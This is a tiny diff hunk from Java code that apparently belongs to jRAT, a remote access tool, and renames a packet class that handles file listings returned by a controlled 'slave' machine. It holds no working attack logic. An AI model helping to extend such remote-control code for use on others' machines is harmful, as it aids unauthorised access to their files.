@@ -10,7 +10,7 @@ import se.jrat.client.utils.IconUtils;
 import se.jrat.common.utils.DataUnits;
 
 
-public class Packet19ListFiles extends AbstractIncomingPacket {
+public class Packet22ListFiles extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
